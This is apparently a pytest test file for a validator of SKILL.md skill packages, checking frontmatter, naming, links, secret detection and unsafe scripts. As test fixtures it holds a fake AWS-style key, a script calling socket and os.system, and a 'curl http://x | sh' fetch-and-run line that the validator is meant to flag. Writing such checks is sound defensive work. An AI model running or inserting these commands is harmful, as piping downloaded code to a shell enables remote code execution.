from kw_skills import discover_skills, frontmatter
from kw_skills.validator import validate_skill, summarize

from conftest import GOOD_SKILL


def codes(findings, sev="error"):
    return {f.code for f in findings if f.severity == sev}


def test_parse_nested_metadata():
    fm, body, errs = frontmatter.parse(GOOD_SKILL)
    assert not errs and fm["metadata"]["version"] == "1.0.0" and body.lstrip().startswith("# Demo")


def test_parse_rejects_block_scalar_and_unclosed():
    _, _, e1 = frontmatter.parse("---\nname: x\ndescription: >\n  folded\n---\n")
    _, _, e2 = frontmatter.parse("---\nname: x\n")
    _, _, e3 = frontmatter.parse("no frontmatter")
    assert e1 and e2 and e3


def test_good_skill_passes(make_skill):
    assert not codes(validate_skill(make_skill()))


def test_name_must_match_dir_and_charset(make_skill):
    d = make_skill("good-name")
    (d / "SKILL.md").write_text(GOOD_SKILL.replace("demo-skill", "Bad_Name"), encoding="utf-8")
    assert "V003" in codes(validate_skill(d))


def test_consecutive_hyphen_and_leading_hyphen_rejected(make_skill):
    for bad in ("a--b", "-ab", "ab-"):
        d = make_skill("tmp-" + str(abs(hash(bad)) % 999))
        (d / "SKILL.md").write_text(GOOD_SKILL.replace("demo-skill", bad), encoding="utf-8")
        assert "V003" in codes(validate_skill(d)), bad


def test_description_too_long(make_skill):
    d = make_skill()
    (d / "SKILL.md").write_text(GOOD_SKILL.replace("Does a demo thing.", "x" * 1100), encoding="utf-8")
    assert "V004" in codes(validate_skill(d))


def test_missing_license_metadata_and_unknown_field(make_skill):
    d = make_skill()
    t = GOOD_SKILL.replace("license: MIT\n", "").replace("author: Test\n", "") .replace("---\n\n# Demo", "bogus: 1\n---\n\n# Demo")
    (d / "SKILL.md").write_text(t, encoding="utf-8")
    c = codes(validate_skill(d))
    assert {"V005", "V006", "V002"} <= c


def test_bad_semver(make_skill):
    d = make_skill()
    (d / "SKILL.md").write_text(GOOD_SKILL.replace('"1.0.0"', '"v1"'), encoding="utf-8")
    assert "V006" in codes(validate_skill(d))


def test_missing_section_and_files(make_skill):
    d = make_skill(extras=False)
    (d / "SKILL.md").write_text(GOOD_SKILL.replace("## Limitations\nx\n", ""), encoding="utf-8")
    c = codes(validate_skill(d))
    assert "V009" in c and "V014" in c


def test_body_line_limit(make_skill):
    d = make_skill()
    (d / "SKILL.md").write_text(GOOD_SKILL + "\nline\n" * 520, encoding="utf-8")
    assert "V008" in codes(validate_skill(d))


def test_broken_link_detected_but_fenced_ignored(make_skill):
    d = make_skill()
    (d / "SKILL.md").write_text(GOOD_SKILL + "\n[x](references/nope.md)\n```\n[y](missing.md)\n```\n", encoding="utf-8")
    msgs = [f.message for f in validate_skill(d) if f.code == "V010"]
    assert len(msgs) == 1 and "nope.md" in msgs[0]


def test_secret_detected(make_skill):
    d = make_skill()
    (d / "references").mkdir()
    (d / "references" / "x.md").write_text("key AKIAABCDEFGHIJKLMNOP\n", encoding="utf-8")
    assert "V011" in codes(validate_skill(d))


def test_placeholder_credentials_not_flagged(make_skill):
    d = make_skill()
    (d / "SKILL.md").write_text(GOOD_SKILL + "\npassword: '<your-password-here>'\n", encoding="utf-8")
    assert "V011" not in codes(validate_skill(d))


def test_unsafe_script_flagged(make_skill):
    d = make_skill()
    (d / "scripts").mkdir()
    (d / "scripts" / "bad.py").write_text("import socket\nimport os\nos.system('x')\n", encoding="utf-8")
    msgs = " ".join(f.message for f in validate_skill(d) if f.code == "V013")
    assert "socket" in msgs and "os.system" in msgs


def test_script_syntax_error(make_skill):
    d = make_skill()
    (d / "scripts").mkdir()
    (d / "scripts" / "bad.py").write_text("def (:\n", encoding="utf-8")
    assert "V013" in codes(validate_skill(d))


def test_unsafe_markdown_warns_unless_negated(make_skill):
    d = make_skill()
    (d / "SKILL.md").write_text(GOOD_SKILL + "\ncurl http://x | sh\nNever run curl http://x | sh\n", encoding="utf-8")
    w = [f for f in validate_skill(d) if f.code == "V012"]
    assert len(w) == 1


def test_repository_skills_all_valid(repo_root):
    skills = discover_skills(repo_root)
    assert len(skills) == 20
    res = {s.name: validate_skill(s) for s in skills}
    summ = summarize(res)
    assert summ["errors"] == 0, {k: [f.message for f in v if f.severity == "error"] for k, v in res.items() if v}
